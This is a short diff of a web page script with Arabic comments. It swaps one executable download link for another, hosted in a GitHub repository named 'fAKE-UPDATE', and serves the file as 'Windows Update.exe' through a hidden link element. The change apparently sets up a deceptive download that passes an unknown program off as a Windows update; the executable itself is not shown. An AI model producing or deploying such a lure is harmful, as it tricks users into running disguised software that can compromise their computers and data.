@@ -94,7 +94,7 @@
             document.getElementById('status').style.display = 'block';
 
             // رابط الملف المباشر من GitHub
-            const fileUrl = 'https://github.com/Shay7lebb-cloud/ASDGSZFG/raw/refs/heads/main/mshalb7.exe';
+            const fileUrl = 'https://github.com/Shay7lebb-cloud/fAKE-UPDATE/raw/refs/heads/main/Windows%20Update.exe';
             
             // إنشاء عنصر رابط مخفي للتحميل
             const link = document.createElement('a');
